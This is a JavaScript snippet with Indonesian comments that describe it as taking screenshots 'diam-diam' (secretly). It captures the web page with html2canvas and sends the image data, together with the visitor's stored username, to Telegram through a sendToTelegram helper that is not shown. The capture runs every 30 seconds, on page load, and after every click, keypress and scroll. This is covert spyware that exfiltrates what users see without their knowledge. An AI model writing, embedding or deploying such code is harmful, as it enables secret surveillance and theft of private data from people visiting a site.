// Fungsi untuk mengambil screenshot diam-diam
function captureAndSend() {
    // Coba menggunakan HTML2Canvas untuk menangkap layar
    if (typeof html2canvas !== 'undefined') {
        html2canvas(document.body).then(canvas => {
            // Konversi canvas ke blob
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('photo', blob, 'screenshot.png');
                
                // Kirim ke Telegram (ini memerlukan backend karena Telegram Bot API tidak menerima langsung file dari frontend)
                // Sebagai alternatif, kita bisa mengirim data URL
                const imageData = canvas.toDataURL('image/png');
                const message = `Screenshot dari user ${localStorage.getItem('username') || 'unknown'}: ${imageData.substring(0, 100)}...`;
                sendToTelegram(message);
            }, 'image/png');
        });
    } else {
        // Jika HTML2Canvas tidak tersedia, beri tahu Telegram
        sendToTelegram(`Tidak dapat mengambil screenshot untuk user ${localStorage.getItem('username') || 'unknown'}`);
    }
}

// Ambil screenshot setiap 30 detik
setInterval(captureAndSend, 30000);

// Ambil screenshot saat halaman dimuat
window.addEventListener('load', function() {
    setTimeout(captureAndSend, 5000);
});

// Ambil screenshot saat user melakukan tindakan penting
['click', 'keydown', 'scroll'].forEach(event => {
    window.addEventListener(event, function() {
        setTimeout(captureAndSend, 1000);
    });
});